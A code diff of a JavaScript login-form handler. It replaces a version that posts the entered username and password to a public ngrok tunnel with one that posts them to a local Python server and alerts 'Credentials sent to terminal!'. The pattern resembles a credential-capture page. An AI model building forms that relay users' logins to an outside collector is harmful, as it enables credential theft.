@@ -1,31 +1,30 @@
-'document.addEventListener('DOMContentLoaded', function() {
-    const form = document.querySelector('form');
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+  
+  const account = document.getElementById('account').value;
+  const password = document.getElementById('password').value;
 
-    form.addEventListener('submit', function(event) {
-        event.preventDefault(); // Prevent the default form submission
+  // Prepare the data to send
+  const loginData = {
+    username: account,
+    password: password
+  };
 
-        const username = document.getElementById('login').value;
-        const password = document.getElementById('password').value;
-
-        fetch('https://44b7-184-64-18-124.ngrok-free.app', { // Replace with your ngrok URL
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                username: username,
-                password: password
-            })
-        })
-        .then(response => response.json())
-        .then(data => {
-            console.log('Success:', data);
-            // Handle the response from the server
-        })
-        .catch((error) => {
-            console.error('Error:', error);
-            // Handle errors here
-        });
-    });
+  // Send data to the Python server
+  fetch('http://127.0.0.1:5000/login', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(loginData)
+  })
+  .then(response => response.json())
+  .then(data => {
+    console.log('Success:', data);
+    alert('Credentials sent to terminal!');
+  })
+  .catch((error) => {
+    console.error('Error:', error);
+    alert('Could not connect to the Python server. Make sure it is running!');
+  });
 });
-
